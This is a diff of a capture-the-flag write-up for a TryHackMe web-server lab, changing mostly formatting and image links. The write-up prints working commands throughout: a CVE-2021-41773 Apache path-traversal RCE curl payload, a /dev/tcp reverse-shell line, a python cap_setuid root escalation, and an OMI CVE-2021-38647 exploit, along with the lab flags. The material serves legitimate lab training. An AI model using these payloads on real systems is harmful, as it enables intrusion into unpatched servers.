@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f578-fe0f
 ---
+# ENUMERATION
+---
 
-# OH MY WEBSERVER
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | ssh     |
 | 80   | http    |
 
@@ -36,19 +34,21 @@ sticker: emoji//1f578-fe0f
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
 
-***
+# RECONNAISSANCE
+---
 
 As we can see in the scan, the webserver is running `apache 2.4.49`, let's check for an exploit regarding the version. As basic enumeration didn't bring anything useful:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324142059.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324142059.png)
 
 We can find `CVE-2021-41773`, it talks about `path traversal and RCE`, let's take a look at it:
 
 Link: https://www.hackthebox.com/blog/cve-2021-41773-explained
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324142413.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324142413.png)
 
 We get `403` status code, but this does not mean we cannot exploit it, let's try a payload test:
 
@@ -60,31 +60,41 @@ We can try that payload test and pass it to the proxy to easily modify the reque
 curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; id' --proxy http://127.0.0.1:8080
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324143146.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324143146.png)
 
 There we go, we got RCE.
 
-## EXPLOITATION
 
-***
+
+
+# EXPLOITATION
+---
 
 Since we got RCE, we can send ourselves a reverse shell, let's use the following payload:
+
 
 ```
 curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/IP/PORT 0>&1'
 ```
 
+
 If we send it, we can see our reverse shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324143438.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324143438.png)
+
 
 Let's proceed to privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+
+# PRIVILEGE ESCALATION
+---
+
 
 We can begin by getting our stable shell:
+
 
 1. python3 -c 'import pty;pty.spawn("/bin/bash")'
 2. /usr/bin/script -qc /bin/bash /dev/null
@@ -94,15 +104,16 @@ We can begin by getting our stable shell:
 6. export TERM=xterm
 7. export BASH=bash
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324143608.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324143608.png)
 
 There we go, let's start, first, let's check the `/` directory to check if we're in a docker environment:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324143717.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324143717.png)
 
 There we go, we are inside of a docker environment, let's check `/etc/hosts`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324143813.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324143813.png)
 
 We can do some basic enumeration on the docker environment:
 
@@ -123,11 +134,11 @@ We got `python 3.7` with the `cap_setuid` capability, we can exploit this to get
 /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324144612.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324144612.png)
 
 We can find the `user.txt` file inside of the root folder:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324144801.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324144801.png)
 
 ```
 root@4a70924bafa0:/# cat /root/user.txt
@@ -136,7 +147,7 @@ THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
 
 Since we got root, we can scan the machine with nmap, let's get the nmap binary:
 
-Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap
+Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
 Let's get it in our local machine and start a python server, now, let's get it:
 
@@ -157,19 +168,20 @@ So, we can scan with the following:
 ./nmap 172.17.0.1 -p- --min-rate 5000 
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324145632.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324145632.png)
 
 Ports `5985` and `5986` are enabled, since `5985` is closed, we can check for some info regarding the other one:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324145844.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324145844.png)
 
 We are dealing with OMI, let's search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324145908.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324145908.png)
+
 
 Let's download the exploit and test the PoC:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324150038.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324150038.png)
 
 There we go, we got the RCE, with this exploit I couldn't do anything more useful so I tried with this one:
 
@@ -179,7 +191,7 @@ Link: https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647
 python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324150946.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324150946.png)
 
 We got the root flag:
 
@@ -188,4 +200,6 @@ python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
 THM{7f147ef1f36da9ae29529890a1b6011f}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250324151021.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250324151021.png)
+
+
